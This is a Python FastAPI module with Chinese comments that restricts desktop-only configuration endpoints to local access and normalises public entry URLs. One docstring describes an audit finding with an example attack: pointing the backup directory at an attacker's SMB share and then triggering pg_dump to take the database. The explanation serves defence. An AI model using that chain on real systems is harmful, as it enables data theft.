"""本机专用的配置端点：给桌面托盘 / 控制面板用。

存在的理由和 /local/qr 一样：桌面端没有登录态，调不动 /admin/* 那套接口，
但它确实需要读写几个「服务层」的配置（不是用户数据，是这台机器怎么对外）。

所有端点都只允许本机访问，判定逻辑用 security.effective_client_ip ——
那套逻辑处理了「经 Caddy 反代后 client.host 全是 127.0.0.1」这个陷阱。

内容范围刻意收得很窄：只有公网入口地址。别的东西（账号、权限、文件）
一律不放这里，那些必须走正常的认证通道。
"""

from __future__ import annotations

from urllib.parse import urlsplit

from fastapi import APIRouter, HTTPException, Request
from pydantic import BaseModel

from app import settings
from app.security import effective_client_ip, is_public_entry

router = APIRouter()

_LOOPBACKS = ("127.0.0.1", "::1", "localhost")


def _require_local(request: Request) -> None:
    """非本机一律 403。

    🔴 只看 IP 是不够的，这是 2026-11-04 审查抓到的 P0。

    FRP 隧道的物理链路是「公网 → frps → frpc(本机) → Caddy → 127.0.0.1:8766」。
    Caddy 看到的 remote_host 就是 127.0.0.1，注入的 X-Real-IP 也是
    127.0.0.1 —— 于是**公网陌生人发来的请求和桌面托盘发来的请求，
    在 IP 这个维度上完全一样**。只判 IP 等于把这组免登录端点对整个公网开放：

      · POST /local/backup/dir  {"dir": "\\\\attacker\\share"}   ← 改备份目录
      · POST /local/backup/run                                    ← 触发 pg_dump
        两步合起来 = 整个数据库（口令哈希、会话哈希、全部元数据）被写到
        攻击者的 SMB 共享上。
      · POST /local/public-url   ← 清空/篡改公网入口配置
      · GET  /local/backup       ← 泄露磁盘绝对路径与备份清单

    项目自己在 security.py 里早就写明了「FRP 使 client_ip 全为 127.0.0.1、
    不能按 IP 区分内外」，而 is_public_entry() 就是照这条结论做的可信判据：
    Caddy 在隧道端口注入 X-LanShare-Entry: public，客户端伪造不了。
    这里之前没有用它，属于同一个结论只落了一半。
    """
    if is_public_entry(request):
        raise HTTPException(status_code=403, detail="该接口仅限本机访问")
    ip = effective_client_ip(request)
    if ip not in _LOOPBACKS:
        raise HTTPException(status_code=403, detail="该接口仅限本机访问")


class PublicUrlBody(BaseModel):
    url: str = ""
    url_alt: str = ""


def _normalize(raw: str) -> tuple[str, str]:
    """把用户输入整理成规范形式，返回 (存库值, 错误说明)。

    用户可能输入：
        xxx.frp-any.com:35391       → 补 https://
        https://xxx.frp-any.com:35391/
        http://192.168.1.100:8765    → 允许，但要提醒这不是公网地址

    空字符串表示「清除配置」，合法。
    """
    text = (raw or "").strip()
    if not text:
        return "", ""

    if not text.startswith(("http://", "https://")):
        # 没写协议：默认 https。公网入口几乎都是 HTTPS，
        # 而 sakuraFrp 的「自动 HTTPS」也是这个假设。
        text = "https://" + text

    parts = urlsplit(text)
    if not parts.netloc:
        return "", f"地址里没有主机名：{raw}"

    # 去掉尾部斜杠，存库统一形态（前端拼路径时不会出现双斜杠）
    normalized = f"{parts.scheme}://{parts.netloc}"
    return normalized, ""


@router.get("/local/public-url")
async def get_public_url(request: Request):
    """读当前配置的公网入口地址。

    返回的 url 是存库值；available 表示服务器实际能不能读库
    （比如数据库还没初始化时 get_setting 会抛异常）。
    """
    _require_local(request)
    try:
        primary = settings.get_setting(settings.PUBLIC_BASE_URL)
        alt = settings.get_setting(settings.PUBLIC_BASE_URL_ALT)
    # 读不到要说出来，不能装作空配置（项目已 ignore BLE001，无需 noqa）
    except Exception as exc:
        return {
            "url": "",
            "url_alt": "",
            "available": False,
            "error": f"读取配置失败：{exc}",
        }
    return {"url": primary or "", "url_alt": alt or "", "available": True, "error": ""}


@router.post("/local/public-url")
async def set_public_url(request: Request, body: PublicUrlBody):
    """保存公网入口地址。

    保存后立即清掉 security 的 netloc 缓存，否则要等 60 秒才生效 ——
    用户填完点「验证」会以为没保存成功。
    """
    _require_local(request)

    primary, err = _normalize(body.url)
    if err:
        raise HTTPException(status_code=422, detail=err)
    alt, err2 = _normalize(body.url_alt)
    if err2:
        raise HTTPException(status_code=422, detail=err2)

    try:
        settings.set_setting(settings.PUBLIC_BASE_URL, primary)
        settings.set_setting(settings.PUBLIC_BASE_URL_ALT, alt)
    except Exception as exc:
        raise HTTPException(status_code=500, detail=f"保存失败：{exc}") from exc

    # 改完立即生效（不然防爆破的公网/LAN 分账要等 60 秒才切过来）
    try:
        from app.security import reset_netloc_cache

        reset_netloc_cache()
    # 缓存清不掉不影响保存结果
    except Exception:
        pass

    return {"ok": True, "url": primary, "url_alt": alt}
